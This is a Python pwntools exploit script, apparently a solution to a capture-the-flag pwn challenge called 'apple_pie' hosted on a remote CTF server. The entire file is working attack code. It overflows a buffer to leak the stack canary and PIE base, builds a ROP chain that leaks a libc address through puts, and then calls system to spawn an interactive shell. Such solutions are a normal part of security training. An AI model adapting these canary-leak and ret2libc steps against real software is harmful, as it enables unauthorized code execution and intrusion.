from pwn import *

'''
 Arch:     amd64-64-little
 RELRO:    No RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      PIE enabled
'''

context(arch="amd64", os='linux')
e = ELF('./apple_pie')

r = remote("pwn.h4ckingga.me", 10005)
#r = process(e.path)

dummy = "Yes"+"A"*0x36

# get canary & pie base
r.send(dummy)
init = int(r.recv(14),16)
base = init - 0x1199
print("init : ", hex(init))
r.recvuntil("Input : ")
print(r.recv(0x39))
canary = u64("\x00"+r.recv(7))
print("canary : ",hex(canary))
#print("canary : ", hex(canary))
print(hex(u64(r.recv(6)+"\x00\x00")))


r.recv()
# leak libc base
pop_rdi = p64(base+0x1373)
sh = p64(base+0x2ed3)
puts = p64(base+0x34e0)
main = p64(base+0x12e6)

dummy = "A"*0x38
payload  = dummy
payload += p64(canary)
payload += "A"*8
payload += pop_rdi
payload += p64(base + e.got['read'])
payload += p64(base + e.plt['puts'])
payload += main
r.send(payload)
read_got = u64(r.recv(6)+"\x00\x00")
print(hex(read_got))
libc_base = read_got-0x111130
system = p64(libc_base+	0x055410)
ret = p64(base + 0x101a)

print(r.recv())
r.send("Yes")
print(r.recv())
sleep(0.1)
print(r.recv())

# exploit
payload  = dummy
payload += p64(canary)
payload += ret*4
payload += pop_rdi
payload += sh
payload += system
r.send(payload)



r.interactive()